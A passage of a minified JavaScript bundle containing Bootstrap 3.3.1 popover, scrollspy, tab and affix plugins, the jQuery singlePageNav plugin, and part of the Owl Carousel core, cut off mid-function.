tooltip.js");c.VERSION="3.3.1",c.DEFAULTS=a.extend({},a.fn.tooltip.Constructor.DEFAULTS,{placement:"right",trigger:"click",content:"",template:'<div class="popover" role="tooltip"><div class="arrow"></div><h3 class="popover-title"></h3><div class="popover-content"></div></div>'}),c.prototype=a.extend({},a.fn.tooltip.Constructor.prototype),c.prototype.constructor=c,c.prototype.getDefaults=function(){return c.DEFAULTS},c.prototype.setContent=function(){var a=this.tip(),b=this.getTitle(),c=this.getContent();a.find(".popover-title")[this.options.html?"html":"text"](b),a.find(".popover-content").children().detach().end()[this.options.html?"string"==typeof c?"html":"append":"text"](c),a.removeClass("fade top bottom left right in"),a.find(".popover-title").html()||a.find(".popover-title").hide()},c.prototype.hasContent=function(){return this.getTitle()||this.getContent()},c.prototype.getContent=function(){var a=this.$element,b=this.options;return a.attr("data-content")||("function"==typeof b.content?b.content.call(a[0]):b.content)},c.prototype.arrow=function(){return this.$arrow=this.$arrow||this.tip().find(".arrow")},c.prototype.tip=function(){return this.$tip||(this.$tip=a(this.options.template)),this.$tip};var d=a.fn.popover;a.fn.popover=b,a.fn.popover.Constructor=c,a.fn.popover.noConflict=function(){return a.fn.popover=d,this}}(jQuery),+function(a){"use strict";function b(c,d){var e=a.proxy(this.process,this);this.$body=a("body"),this.$scrollElement=a(a(c).is("body")?window:c),this.options=a.extend({},b.DEFAULTS,d),this.selector=(this.options.target||"")+" .nav li > a",this.offsets=[],this.targets=[],this.activeTarget=null,this.scrollHeight=0,this.$scrollElement.on("scroll.bs.scrollspy",e),this.refresh(),this.process()}function c(c){return this.each(function(){var d=a(this),e=d.data("bs.scrollspy"),f="object"==typeof c&&c;e||d.data("bs.scrollspy",e=new b(this,f)),"string"==typeof c&&e[c]()})}b.VERSION="3.3.1",b.DEFAULTS={offset:10},b.prototype.getScrollHeight=function(){return this.$scrollElement[0].scrollHeight||Math.max(this.$body[0].scrollHeight,document.documentElement.scrollHeight)},b.prototype.refresh=function(){var b="offset",c=0;a.isWindow(this.$scrollElement[0])||(b="position",c=this.$scrollElement.scrollTop()),this.offsets=[],this.targets=[],this.scrollHeight=this.getScrollHeight();var d=this;this.$body.find(this.selector).map(function(){var d=a(this),e=d.data("target")||d.attr("href"),f=/^#./.test(e)&&a(e);return f&&f.length&&f.is(":visible")&&[[f[b]().top+c,e]]||null}).sort(function(a,b){return a[0]-b[0]}).each(function(){d.offsets.push(this[0]),d.targets.push(this[1])})},b.prototype.process=function(){var a,b=this.$scrollElement.scrollTop()+this.options.offset,c=this.getScrollHeight(),d=this.options.offset+c-this.$scrollElement.height(),e=this.offsets,f=this.targets,g=this.activeTarget;if(this.scrollHeight!=c&&this.refresh(),b>=d)return g!=(a=f[f.length-1])&&this.activate(a);if(g&&b<e[0])return this.activeTarget=null,this.clear();for(a=e.length;a--;)g!=f[a]&&b>=e[a]&&(!e[a+1]||b<=e[a+1])&&this.activate(f[a])},b.prototype.activate=function(b){this.activeTarget=b,this.clear();var c=this.selector+'[data-target="'+b+'"],'+this.selector+'[href="'+b+'"]',d=a(c).parents("li").addClass("active");d.parent(".dropdown-menu").length&&(d=d.closest("li.dropdown").addClass("active")),d.trigger("activate.bs.scrollspy")},b.prototype.clear=function(){a(this.selector).parentsUntil(this.options.target,".active").removeClass("active")};var d=a.fn.scrollspy;a.fn.scrollspy=c,a.fn.scrollspy.Constructor=b,a.fn.scrollspy.noConflict=function(){return a.fn.scrollspy=d,this},a(window).on("load.bs.scrollspy.data-api",function(){a('[data-spy="scroll"]').each(function(){var b=a(this);c.call(b,b.data())})})}(jQuery),+function(a){"use strict";function b(b){return this.each(function(){var d=a(this),e=d.data("bs.tab");e||d.data("bs.tab",e=new c(this)),"string"==typeof b&&e[b]()})}var c=function(b){this.element=a(b)};c.VERSION="3.3.1",c.TRANSITION_DURATION=150,c.prototype.show=function(){var b=this.element,c=b.closest("ul:not(.dropdown-menu)"),d=b.data("target");if(d||(d=b.attr("href"),d=d&&d.replace(/.*(?=#[^\s]*$)/,"")),!b.parent("li").hasClass("active")){var e=c.find(".active:last a"),f=a.Event("hide.bs.tab",{relatedTarget:b[0]}),g=a.Event("show.bs.tab",{relatedTarget:e[0]});if(e.trigger(f),b.trigger(g),!g.isDefaultPrevented()&&!f.isDefaultPrevented()){var h=a(d);this.activate(b.closest("li"),c),this.activate(h,h.parent(),function(){e.trigger({type:"hidden.bs.tab",
relatedTarget:b[0]}),b.trigger({type:"shown.bs.tab",relatedTarget:e[0]})})}}},c.prototype.activate=function(b,d,e){function f(){g.removeClass("active").find("> .dropdown-menu > .active").removeClass("active").end().find('[data-toggle="tab"]').attr("aria-expanded",!1),b.addClass("active").find('[data-toggle="tab"]').attr("aria-expanded",!0),h?(b[0].offsetWidth,b.addClass("in")):b.removeClass("fade"),b.parent(".dropdown-menu")&&b.closest("li.dropdown").addClass("active").end().find('[data-toggle="tab"]').attr("aria-expanded",!0),e&&e()}var g=d.find("> .active"),h=e&&a.support.transition&&(g.length&&g.hasClass("fade")||!!d.find("> .fade").length);g.length&&h?g.one("bsTransitionEnd",f).emulateTransitionEnd(c.TRANSITION_DURATION):f(),g.removeClass("in")};var d=a.fn.tab;a.fn.tab=b,a.fn.tab.Constructor=c,a.fn.tab.noConflict=function(){return a.fn.tab=d,this};var e=function(c){c.preventDefault(),b.call(a(this),"show")};a(document).on("click.bs.tab.data-api",'[data-toggle="tab"]',e).on("click.bs.tab.data-api",'[data-toggle="pill"]',e)}(jQuery),+function(a){"use strict";function b(b){return this.each(function(){var d=a(this),e=d.data("bs.affix"),f="object"==typeof b&&b;e||d.data("bs.affix",e=new c(this,f)),"string"==typeof b&&e[b]()})}var c=function(b,d){this.options=a.extend({},c.DEFAULTS,d),this.$target=a(this.options.target).on("scroll.bs.affix.data-api",a.proxy(this.checkPosition,this)).on("click.bs.affix.data-api",a.proxy(this.checkPositionWithEventLoop,this)),this.$element=a(b),this.affixed=this.unpin=this.pinnedOffset=null,this.checkPosition()};c.VERSION="3.3.1",c.RESET="affix affix-top affix-bottom",c.DEFAULTS={offset:0,target:window},c.prototype.getState=function(a,b,c,d){var e=this.$target.scrollTop(),f=this.$element.offset(),g=this.$target.height();if(null!=c&&"top"==this.affixed)return c>e?"top":!1;if("bottom"==this.affixed)return null!=c?e+this.unpin<=f.top?!1:"bottom":a-d>=e+g?!1:"bottom";var h=null==this.affixed,i=h?e:f.top,j=h?g:b;return null!=c&&c>=i?"top":null!=d&&i+j>=a-d?"bottom":!1},c.prototype.getPinnedOffset=function(){if(this.pinnedOffset)return this.pinnedOffset;this.$element.removeClass(c.RESET).addClass("affix");var a=this.$target.scrollTop(),b=this.$element.offset();return this.pinnedOffset=b.top-a},c.prototype.checkPositionWithEventLoop=function(){setTimeout(a.proxy(this.checkPosition,this),1)},c.prototype.checkPosition=function(){if(this.$element.is(":visible")){var b=this.$element.height(),d=this.options.offset,e=d.top,f=d.bottom,g=a("body").height();"object"!=typeof d&&(f=e=d),"function"==typeof e&&(e=d.top(this.$element)),"function"==typeof f&&(f=d.bottom(this.$element));var h=this.getState(g,b,e,f);if(this.affixed!=h){null!=this.unpin&&this.$element.css("top","");var i="affix"+(h?"-"+h:""),j=a.Event(i+".bs.affix");if(this.$element.trigger(j),j.isDefaultPrevented())return;this.affixed=h,this.unpin="bottom"==h?this.getPinnedOffset():null,this.$element.removeClass(c.RESET).addClass(i).trigger(i.replace("affix","affixed")+".bs.affix")}"bottom"==h&&this.$element.offset({top:g-b-f})}};var d=a.fn.affix;a.fn.affix=b,a.fn.affix.Constructor=c,a.fn.affix.noConflict=function(){return a.fn.affix=d,this},a(window).on("load",function(){a('[data-spy="affix"]').each(function(){var c=a(this),d=c.data();d.offset=d.offset||{},null!=d.offsetBottom&&(d.offset.bottom=d.offsetBottom),null!=d.offsetTop&&(d.offset.top=d.offsetTop),b.call(c,d)})})}(jQuery);

"function"!=typeof Object.create&&(Object.create=function(a){function b(){}return b.prototype=a,new b}),function(a,b,c,d){"use strict";var e={init:function(c,d){this.options=a.extend({},a.fn.singlePageNav.defaults,c),this.container=d,this.$container=a(d),this.$links=this.$container.find("a"),""!==this.options.filter&&(this.$links=this.$links.filter(this.options.filter)),this.$window=a(b),this.$htmlbody=a("html, body"),this.$links.on("click.singlePageNav",a.proxy(this.handleClick,this)),this.didScroll=!1,this.checkPosition(),this.setTimer()},handleClick:function(b){var c=this,d=b.currentTarget,e=a(d.hash);b.preventDefault(),e.length&&(c.clearTimer(),"function"==typeof c.options.beforeStart&&c.options.beforeStart(),c.setActiveLink(d.hash),c.scrollTo(e,function(){c.options.updateHash&&history.pushState&&history.pushState(null,null,d.hash),c.setTimer(),"function"==typeof c.options.onComplete&&c.options.onComplete()}))},scrollTo:function(a,b){var c=this,d=c.getCoords(a).top,e=!1;c.$htmlbody.stop().animate({scrollTop:d},{duration:c.options.speed,easing:c.options.easing,complete:function(){"function"!=typeof b||e||b(),e=!0}})},setTimer:function(){var a=this;a.$window.on("scroll.singlePageNav",function(){a.didScroll=!0}),a.timer=setInterval(function(){a.didScroll&&(a.didScroll=!1,a.checkPosition())},250)},clearTimer:function(){clearInterval(this.timer),this.$window.off("scroll.singlePageNav"),this.didScroll=!1},checkPosition:function(){var a=this.$window.scrollTop(),b=this.getCurrentSection(a);null!==b&&this.setActiveLink(b)},getCoords:function(a){return{top:Math.round(a.offset().top)-this.options.offset}},setActiveLink:function(a){var b=this.$container.find("a[href$='"+a+"']");b.hasClass(this.options.currentClass)||(this.$links.removeClass(this.options.currentClass),b.addClass(this.options.currentClass))},getCurrentSection:function(d){var e,f,g,h;for(e=0;e<this.$links.length;e++)f=this.$links[e].hash,a(f).length&&(g=this.getCoords(a(f)),d>=g.top-this.options.threshold&&(h=f));var i=a(c).height()-a(b).height();if(d==i){var j=this.$links.length;j>0&&(h=this.$links[j-1].hash)}return h||(0===this.$links.length?null:this.$links[0].hash)}};a.fn.singlePageNav=function(a){return this.each(function(){var b=Object.create(e);b.init(a,this)})},a.fn.singlePageNav.defaults={offset:0,threshold:120,speed:400,currentClass:"current",easing:"swing",updateHash:!1,filter:"",onComplete:!1,beforeStart:!1}}(jQuery,window,document);

!function(a,b,c,d){function e(b,c){this.settings=null,this.options=a.extend({},e.Defaults,c),this.$element=a(b),this._handlers={},this._plugins={},this._supress={},this._current=null,this._speed=null,this._coordinates=[],this._breakpoint=null,this._width=null,this._items=[],this._clones=[],this._mergers=[],this._widths=[],this._invalidated={},this._pipe=[],this._drag={time:null,target:null,pointer:null,stage:{start:null,current:null},direction:null},this._states={current:{},tags:{initializing:["busy"],animating:["busy"],dragging:["interacting"]}},a.each(["onResize","onThrottledResize"],a.proxy(function(b,c){this._handlers[c]=a.proxy(this[c],this)},this)),a.each(e.Plugins,a.proxy(function(a,b){this._plugins[a.charAt(0).toLowerCase()+a.slice(1)]=new b(this)},this)),a.each(e.Workers,a.proxy(function(b,c){this._pipe.push({filter:c.filter,run:a.proxy(c.run,this)})},this)),this.setup(),this.initialize()}e.Defaults={items:3,loop:!1,center:!1,rewind:!1,mouseDrag:!0,touchDrag:!0,pullDrag:!0,freeDrag:!1,margin:0,stagePadding:0,merge:!1,mergeFit:!0,autoWidth:!1,startPosition:0,rtl:!1,smartSpeed:250,fluidSpeed:!1,dragEndSpeed:!1,responsive:{},responsiveRefreshRate:200,responsiveBaseElement:b,fallbackEasing:"swing",info:!1,nestedItemSelector:!1,itemElement:"div",stageElement:"div",refreshClass:"owl-refresh",loadedClass:"owl-loaded",loadingClass:"owl-loading",rtlClass:"owl-rtl",responsiveClass:"owl-responsive",dragClass:"owl-drag",itemClass:"owl-item",stageClass:"owl-stage",stageOuterClass:"owl-stage-outer",grabClass:"owl-grab"},e.Width={Default:"default",Inner:"inner",Outer:"outer"},e.Type={Event:"event",State:"state"},e.Plugins={},e.Workers=[{filter:["width","settings"],run:function(){this._width=this.$element.width()}},{filter:["width","items","settings"],run:function(a){a.current=this._items&&this._items[this.relative(this._current)]}},{filter:["items","settings"],run:function(){this.$stage.children(".cloned").remove()}},{filter:["width","items","settings"],run:function(a){var b=this.settings.margin||"",c=!this.settings.autoWidth,d=this.settings.rtl,e={width:"auto","margin-left":d?b:"","margin-right":d?"":b};!c&&this.$stage.children().css(e),a.css=e}},{filter:["width","items","settings"],run:function(a){var b=(this.width()/this.settings.items).toFixed(3)-this.settings.margin,c=null,d=this._items.length,e=!this.settings.autoWidth,f=[];for(a.items={merge:!1,width:b};d--;)c=this._mergers[d],c=this.settings.mergeFit&&Math.min(c,this.settings.items)||c,a.items.merge=c>1||a.items.merge,f[d]=e?b*c:this._items[d].width();this._widths=f}},{filter:["items","settings"],run:function(){var b=[],c=this._items,d=this.settings,e=Math.max(2*d.items,4),f=2*Math.ceil(c.length/2),g=d.loop&&c.length?d.rewind?e:Math.max(e,f):0,h="",i="";for(g/=2;g--;)b.push(this.normalize(b.length/2,!0)),h+=c[b[b.length-1]][0].outerHTML,b.push(this.normalize(c.length-1-(b.length-1)/2,!0)),i=c[b[b.length-1]][0].outerHTML+i;this._clones=b,a(h).addClass("cloned").appendTo(this.$stage),a(i).addClass("cloned").prependTo(this.$stage)}},{filter:["width","items","settings"],run:function(){for(var a=this.settings.rtl?1:-1,b=this._clones.length+this._items.length,c=-1,d=0,e=0,f=[];++c<b;)d=f[c-1]||0,e=this._widths[this.relative(c)]+this.settings.margin,f.push(d+e*a);this._coordinates=f}},{filter:["width","items","settings"],run:function(){var a=this.settings.stagePadding,b=this._coordinates,c={width:Math.ceil(Math.abs(b[b.length-1]))+2*a,"padding-left":a||"","padding-right":a||""};this.$stage.css(c)}},{filter:["width","items","settings"],run:function(a){var b=this._coordinates.length,c=!this.settings.autoWidth,d=this.$stage.children();if(c&&a.items.merge)for(;b--;)a.css.width=this._widths[this.relative(b)],d.eq(b).css(a.css);else c&&(a.css.width=a.items.width,d.css(a.css))}},{filter:["items"],run:function(){this._coordinates.length<1&&this.$stage.removeAttr("style")}},{filter:["width","items","settings"],run:function(a){a.current=a.current?this.$stage.children().index(a.current):0,a.current=Math.max(this.minimum(),Math.min(this.maximum(),a.current)),this.reset(a.current)}},{filter:["position"],run:function(){this.animate(this.coordinates(this._current))}},{filter:["width","position","items","settings"],run:function(){var a,b,c,d,e=this.settings.rtl?1:-1,f=2*this.settings.stagePadding,g=this.coordinates(this.current())+f,h=g+this.width()*e,i=[];for(c=0,d=this._coordinates.length;d>c;c++)a=this._coordinates[c-1]||0,b=Math.abs(this._coordinates[c])+f*e,(this.op(a,"<=",g)&&this.op(a,">",h)||this.op(b,"<",g)&&this.op(b,">",h))&&i.push(c);this.$stage.children(".active").removeClass("active"),this.$stage.children(":eq("+i.join("), :eq(")+")").addClass("active"),this.settings.center&&(this.$stage.children(".center").removeClass("center"),this.$stage.children().eq(this.current()).addClass("center"))}}],e.prototype.initialize=function(){if(this.enter("initializing"),this.trigger("initialize"),this.$element.toggleClass(this.settings.rtlClass,this.settings.rtl),this.settings.autoWidth&&!this.is("pre-loading")){var b,c,e;b=this.$element.find("img"),c=this.settings.nestedItemSelector?"."+this.settings.nestedItemSelector:d,e=this.$element.children(c).width(),b.length&&0>=e&&this.preloadAutoWidthImages(b)}this.$element.addClass(this.options.loadingClass),this.$stage=a("<"+this.settings.stageElement+' class="'+this.settings.stageClass+'"/>').wrap('<div class="'+this.settings.stageOuterClass+'"/>'),this.$element.append(this.$stage.parent()),this.replace(this.$element.children().not(this.$stage.parent())),this.$element.is(":visible")?this.refresh():this.invalidate("width"),this.$element.removeClass(this.options.loadingClass).addClass(this.options.loadedClass),this.registerEventHandlers(),this.leave("initializing"),this.trigger("initialized")},e.prototype.setup=function(){var b=this.viewport(),c=this.options.responsive,d=-1,e=null;c?(a.each(c,function(a){b>=a&&a>d&&(d=Number(a))}),e=a.extend({},this.options,c[d]),"function"==typeof e.stagePadding&&(e.stagePadding=e.stagePadding()),delete e.responsive,e.responsiveClass&&this.$element.attr("class",this.$element.attr("class").replace(new RegExp("("+this.options.responsiveClass+"-)\\S+\\s","g"),"$1"+d))):e=a.extend({},this.options),this.trigger("change",{property:{name:"settings",value:e}}),this._breakpoint=d,this.settings=e,this.invalidate("settings"),this.trigger("changed",{property:{name:"settings",value:this.settings}})},e.prototype.optionsLogic=function(){this.settings.autoWidth&&(this.settings.stagePadding=!1,this.settings.merge=!1)},e.prototype.prepare=function(b){var c=this.trigger("prepare",{content:b});return c.data||(c.data=a("<"+this.settings.itemElement+"/>").addClass(this.options.itemClass).append(b)),this.trigger("prepared",{content:c.data}),c.data},e.prototype.update=function(){for(var b=0,c=this._pipe.length,d=a.proxy(function(a){return this[a]},this._invalidated),e={};c>b;)(this._invalidated.all||a.grep(this._pipe[b].filter,d).length>0)&&this._pipe[b].run(e),b++;this._invalidated={},!this.is("valid")&&this.enter("valid")},e.prototype.width=function(a){switch(a=a||e.Width.Default){case e.Width.Inner:case e.Width.Outer:return this._width;default:return this._width-2*this.settings.stagePadding+this.settings.margin}},e.prototype.refresh=function(){this.enter("refreshing"),this.trigger("refresh"),this.setup(),this.optionsLogic(),this.$element.addClass(this.options.refreshClass),this.update(),this.$element.removeClass(this.options.refreshClass),this.leave("refreshing"),this.trigger("refreshed")},e.prototype.onThrottledResize=function(){b.clearTimeout(this.resizeTimer),this.resizeTimer=b.setTimeout(this._handlers.onResize,this.settings.responsiveRefreshRate)},e.prototype.onResize=function(){return this._items.length?this._width===this.$element.width()?!1:this.$element.is(":visible")?(this.enter("resizing"),this.trigger("resize").isDefaultPrevented()?(this.leave("resizing"),!1):(this.invalidate("width"),this.refresh(),this.leave("resizing"),void this.trigger("resized"))):!1:!1},e.prototype.registerEventHandlers=function(){a.support.transition&&this.$stage.on(a.support.transition.end+".owl.core",a.proxy(this.onTransitionEnd,this)),this.settings.responsive!==!1&&this.on(b,"resize",this._handlers.onThrottledResize),this.settings.mouseDrag&&(this.$element.addClass(this.options.dragClass),this.$stage.on("mousedown.owl.core",a.proxy(this.onDragStart,this)),this.$stage.on("dragstart.owl.core selectstart.owl.core",function(){return!1})),this.settings.touchDrag&&(this.$stage.on("touchstart.owl.core",a.proxy(this.onDragStart,this)),this.$stage.on("touchcancel.owl.core",a.proxy(this.onDragEnd,this)))},e.prototype.onDragStart=function(b){var d=null;3!==b.which&&(a.support.transform?(d=this.$stage.css("transform").replace(/.*\(|\)| /g,"").split(","),d={x:d[16===d.length?12:4],y:d[16===d.length?13:5]}):(d=this.$stage.position(),d={x:this.settings.rtl?d.left+this.$stage.width()-this.width()+this.settings.margin:d.left,y:d.top}),this.is("animating")&&(a.support.transform?this.animate(d.x):this.$stage.stop(),this.invalidate("position")),this.$element.toggleClass(this.options.grabClass,"mousedown"===b.type),this.speed(0),this._drag.time=(new Date).getTime(),this._drag.target=a(b.target),this._drag.stage.start=d,this._drag.stage.current=d,this._drag.pointer=this.pointer(b),a(c).on("mouseup.owl.core touchend.owl.core",a.proxy(this.onDragEnd,this)),a(c).one("mousemove.owl.core touchmove.owl.core",a.proxy(function(b){var d=this.difference(this._drag.pointer,this.pointer(b));a(c).on("mousemove.owl.core touchmove.owl.core",a.proxy(this.onDragMove,this)),Math.abs(d.x)<Math.abs(d.y)&&this.is("valid")||(b.preventDefault(),this.enter("dragging"),this.trigger("drag"))},this)))},e.prototype.onDragMove=function(a){var b=null,c=null,d=null,e=this.difference(this._drag.pointer,this.pointer(a)),f=this.difference(this._drag.stage.start,e);this.is("dragging")&&(a.preventDefault(),this.settings.loop?(b=this.coordinates(this.minimum()),c=this.coordinates(this.maximum()+1)-b,f.x=((f.x-b)%c+c)%c+b):(b=this.settings.rtl?this.coordinates(this.maximum()):this.coordinates(this.minimum()),c=this.settings.rtl?this.coordinates(this.minimum()):this.coordinates(this.maximum()),d=this.settings.pullDrag?-1*e.x/5:0,f.x=Math.max(Math.min(f.x,b+d),c+d)),this._drag.stage.current=f,this.animate(f.x))},e.prototype.onDragEnd=function(b){var d=this.difference(this._drag.pointer,this.pointer(b)),e=this._drag.stage.current,f=d.x>0^this.settings.rtl?"left":"right";a(c).off(".owl.core"),this.$element.removeClass(this.options.grabClass),(0!==d.x&&this.is("dragging")||!this.is("valid"))&&(this.speed(this.settings.dragEndSpeed||this.settings.smartSpeed),this.current(this.closest(e.x,0!==d.x?f:this._drag.direction)),this.invalidate("position"),this.update(),this._drag.direction=f,(Math.abs(d.x)>3||(new Date).getTime()-this._drag.time>300)&&this._drag.target.one("click.owl.core",function(){return!1})),this.is("dragging")&&(this.leave("dragging"),this.trigger("dragged"))},e.prototype.closest=function(b,c){var d=-1,e=30,f=this.width(),g=this.coordinates();return this.settings.freeDrag||a.each(g,a.proxy(function(a,h){return"left"===c&&b>h-e&&h+e>b?d=a:"right"===c&&b>h-f-e&&h-f+e>b?d=a+1:this.op(b,"<",h)&&this.op(b,">",g[a+1]||h-f)&&(d="left"===c?a+1:a),-1===d},this)),this.settings.loop||(this.op(b,">",g[this.minimum()])?d=b=this.minimum():this.op(b,"<",g[this.maximum()])&&(d=b=this.maximum())),d},e.prototype.animate=function(b){var c=this.speed()>0;this.is("animating")&&this.onTransitionEnd(),c&&(this.enter("animating"),this.trigger("translate")),a.support.transform3d&&a.support.transition?this.$stage.css({transform:"translate3d("+b+"px,0px,0px)",transition:this.speed()/1e3+"s"}):c?this.$stage.animate({left:b+"px"},this.speed(),this.settings.fallbackEasing,a.proxy(this.onTransitionEnd,this)):this.$stage.css({left:b+"px"})},e.prototype.is=function(a){return this._states.current[a]&&this._states.current[a]>0},e.prototype.current=function(a){if(a===d)return this._current;if(0===this._items.length)return d;if(a=this.normalize(a),this._current!==a){var b=this.trigger("change",{property:{name:"position",value:a}});b.data!==d&&(a=this.normalize(b.data)),this._current=a,this.invalidate("position"),this.trigger("changed",{property:{name:"position",value:this._current}})}return this._current},e.prototype.invalidate=function(b){return"string"===a.type(b)&&(this._invalidated[b]=!0,this.is("valid")&&this.leave("valid")),a.map(this._invalidated,function(a,b){return b})},e.prototype.reset=function(a){a=this.normalize(a),a!==d&&(this._speed=0,this._current=a,this.suppress(["translate","translated"]),this.animate(this.coordinates(a)),this.release(["translate","translated"]))},e.prototype.normalize=function(a,b){var c=this._items.length,e=b?0:this._clones.length;return!this.isNumeric(a)||1>c?a=d:(0>a||a>=c+e)&&(a=((a-e/2)%c+c)%c+e/2),a},e.prototype.relative=function(a){return a-=this._clones.length/2,this.normalize(a,!0)},e.prototype.maximum=function(a){var b,c,d,e=this.settings,f=this._coordinates.length;if(e.loop)f=this._clones.length/2+this._items.length-1;else if(e.autoWidth||e.merge){for(b=this._items.length,c=this._items[--b].width(),d=this.$element.width();b--&&(c+=this._items[b].width()+this.settings.margin,!(c>d)););f=b+1}else f=e.center?this._items.length-1:this._items.length-e.items;return a&&(f-=this._clones.length/2),Math.max(f,0)},e.prototype.minimum=function(a){return a?0:this._clones.length/2},e.prototype.items=function(a){return a===d?this._items.slice():(a=this.normalize(a,!0),this._items[a])},e.prototype.mergers=function(a){return a===d?this._mergers.slice():(a=this.normalize(a,!0),this._mergers[a])},e.prototype.clones=function(b){var c=this._clones.length/2,e=c+this._items.length,f=function(a){return a%2===0?e+a/2:c-(a+1)/2};return b===d?a.map(this._clones,function(a,b){return f(b)}):a.map(this._clones,function(a,c){return a===b?f(c):null})},e.prototype.speed=function(a){return a!==d&&(this._speed=a),this._speed},e.prototype.coordinates=function(b){var c,e=1,f=b-1;return b===d?a.map(this._coordinates,a.proxy(function(a,b){return this.coordinates(b)},this)):(this.settings.center?(this.settings.rtl&&(e=-1,f=b+1),c=this._coordinates[b],c+=(this.width()-c+(this._coordinates[f]||0))/2*e):c=this._coordinates[f]||0,c=Math.ceil(c))},e.prototype.duration=function(a,b,c){return 0===c?0:Math.min(Math.max(Math.abs(b-a),1),6)*Math.abs(c||this.settings.smartSpeed)},e.prototype.to=function(a,b){var c=this.current(),d=null,e=a-this.relative(c),f=(e>0)-(0>e),g=this._items.length,h=this.minimum(),i=this.maximum();this.settings.loop?(!this.settings.rewind&&Math.abs(e)>g/2&&(e+=-1*f*g),a=c+e,d=((a-h)%g+g)%g+h,d!==a&&i>=d-e&&d-e>0&&(c=d-e,a=d,this.reset(c))):this.settings.rewind?(i+=1,a=(a%i+i)%i):a=Math.max(h,Math.min(i,a)),this.speed(this.duration(c,a,b)),this.current(a),this.$element.is(":visible")&&this.update()},e.prototype.next=function(a){a=a||!1,this.to(this.relative(this.current())+1,a)},e.prototype.prev=function(a){a=a||!1,this.to(this.relative(this.current())-1,a)},e.prototype.onTransitionEnd=function(a){return a!==d&&(a.stopPropagation(),(a.target||a.srcElement||a.originalTarget)!==this.$stage.get(0))?!1:(this.leave("animating"),void this.trigger("translated"))},e.prototype.viewport=function(){var d;if(this.options.responsiveBaseElement!==b)d=a(this.options.responsiveBaseElement).width();else if(b.innerWidth)d=b.innerWidth;else{if(!c.documentElement||!c.documentElement.clientWidth)throw"Can not detect viewport width.";d=c.documentElement.clientWidth}return d},e.prototype.replace=function(b){this.$stage.empty(),this._items=[],b&&(b=b instanceof jQuery?b:a(b)),this.settings.nestedItemSelector&&(b=b.find("."+this.settings.nestedItemSelector)),b.filter(function(){return 1===this.nodeType}).each(a.proxy(function(a,b){b=this.prepare(b),this.$stage.append(b),this._items.push(b),this._mergers.push(1*b.find("[data-merge]").addBack("[data-merge]").attr("data-merge")||1)},this)),this.reset(this.isNumeric(this.settings.startPosition)?this.settings.startPosition:0),this.invalidate("items")},e.prototype.add=function(b,c){var e=this.relative(this._current);c=c===d?this._items.length:this.normalize(c,!0),b=b instanceof jQuery?b:a(b),this.trigger("add",{content:b,position:c}),b=this.prepare(b),0===this._items.length||c===this._items.length?(0===this._items.length&&this.$stage.append(b),0!==this._items.length&&this._items[c-1].after(b),this._items.push(b),this._mergers.push(1*b.find("[data-merge]").addBack("[data-merge]").attr("data-merge")||1)):(this._items[c].before(b),this._items.splice(c,0,b),this._mergers.splice(c,0,1*b.find("[data-merge]").addBack("[data-merge]").attr("data-merge")||1)),this._items[e]&&this.reset(this._items[e].index()),this.invalidate("items"),this.trigger("added",{content:b,position:c})},e.prototype.remove=function(a){a=this.normalize(a,!0),a!==d&&(this.trigger("remove",{content:this._items[a],position:a}),this._items[a].remove(),this._items.splice(a,1),this._mergers.splice(a,1),this.invalidate("items"),this.trigger("removed",{content:null,position:a}))},e.prototype.preloadAutoWidthImages=function(b){b.each(a.proxy(function(b,c){this.enter("pre-loading"),c=a(c),a(new Image).one("load",a.proxy(function(a){c.attr("src",a.target.src),c.css("opacity",1),this.leave("pre-loading"),!this.is("pre-loading")&&!this.is("initializing")&&this.refresh()},this)).attr("src",c.attr("src")||c.attr("data-src")||c.attr("data-src-retina"))},this))},e.prototype.destroy=function(){this.$element.off(".owl.core"),this.$stage.off(".owl.core"),a(c).off(".owl.core"),this.settings.responsive!==!1&&(b.clearTimeout(this.resizeTimer),this.off(b,"resize",this._handlers.onThrottledResize));for(var d in this._plugins)this._plugins[d].destroy();this.$stage.children(".cloned").remove(),this.$stage.unwrap(),this.$stage.children().contents().unwrap(),this.$stage.children().unwrap(),this.$element.removeClass(this.options.refreshClass).removeClass(this.options.loadingClass).removeClass(this.options.loadedClass).removeClass(this.options.rtlClass).removeClass(this.options.dragClass).removeClass(this.options.grabClass).attr("class",this.$element.attr("class").replace(new RegExp(this.options.responsiveClass+"-\\S+\\s","g"),"")).removeData("owl.carousel")},e.prototype.op=function(a,b,c){var d=this.settings.rtl;switch(b){case"<":return d?a>c:c>a;case">":return d?c>a:a>c;case">=":return d?c>=a:a>=c;case"<=":return d?a>=c:c>=a}},e.prototype.on=function(a,b,c,d){a.addEventListener?a.addEventListener(b,c,d):a.attachEvent&&a.attachEvent("on"+b,c)},e.prototype.off=function(a,b,c,d){a.removeEventListener?a.removeEventListener(b,c,d):a.detachEvent&&a.detachEvent("on"+b,c)},e.prototype.trigger=function(b,c,d,f,g){var h={item:{count:this._items.length,index:this.current()}},i=a.camelCase(a.grep(["on",b,d],function(a){return a}).join("-").toLowerCase()),j=a.Event([b,"owl",d||"carousel"].join(".").toLowerCase(),a.extend({relatedTarget:this},h,c));return this._supress[b]||(a.each(this._plugins,function(a,b){b.onTrigger&&b.onTrigger(j)}),this.register({type:e.Type.Event,name:b}),this.$element.trigger(j),this.settings&&"function"==typeof this.settings[i]&&this.settings[i].call(this,j)),j},e.prototype.enter=function(b){a.each([b].concat(this._states.tags[b]||[]),a.proxy(function(a,b){this._states.current[b]===d&&(this._states.current[b]=0),this._states.current[b]++},this))},e.prototype.leave=function(b){a.each([b].concat(this._states.tags[b]||[]),a.proxy(function(a,b){this._states.current[b]--},this))},e.prototype.register=function(b){if(b.type===e.Type.Event){if(a.event.special[b.name]||(a.event.special[b.name]={}),!a.event.special[b.name].owl){var c=a.event.special[b.name]._default;a.event.special[b.name]._default=function(a){return!c||!c.apply||a.namespace&&-1!==a.namespace.indexOf("owl")?a.namespace&&a.namespace.indexOf("owl")>-1:c.apply(this,arguments)},a.event.special[b.name].owl=!0}}else b.type===e.Type.State&&(this._states.tags[b.name]?this._states.tags[b.name]=this._states.tags[b.name].concat(b.tags):this._states.tags[b.name]=b.tags,this._states.tags[b.name]=a.grep(this._states.tags[b.name],a.proxy(function(c,d){return a.inArray(c,this._states.tags[b.name])===d},this)))},e.prototype.suppress=function(b){a.each(b,a.proxy(function(a,b){this._supress[b]=!0},this))},e.prototype.release=function(b){a.each(b,a.proxy(function(a,b){delete this._supress[b]},this))},e.prototype.pointer=function(a){var c={x:null,y:null};return 